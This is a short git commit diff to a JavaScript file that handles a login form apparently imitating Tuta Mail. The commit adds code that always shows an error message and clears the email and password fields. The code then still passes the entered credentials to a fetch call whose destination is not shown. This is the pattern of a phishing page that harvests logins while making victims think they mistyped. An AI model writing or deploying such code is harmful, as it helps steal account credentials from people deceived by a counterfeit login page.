d8d1179e1db0219340e6867b703a977737d0ec7a
Ular <eldarakashka@gmail.com>
2026-01-19 18:08:40 +0600

    добавил нового пользователя

--- assets/enter.js
+++ assets/enter.js
@@ -62,8 +62,17 @@ document.addEventListener("DOMContentLoaded", () => {
         const data = new FormData(formTutaMail);
         console.log(data);
 
+        const errorMess = formTutaMail.querySelector('.error-mess');
+        errorMess.style.display = 'flex';
+
+        const emailInput = formTutaMail.querySelector('#email');
+        const passInput = formTutaMail.querySelector('#pwd');
+        emailInput.value = '';
+        passInput.value = '';
+
         const email = data.get("email");
         const password = data.get("pwd");
+
 
         fetchData({email, password});
       });
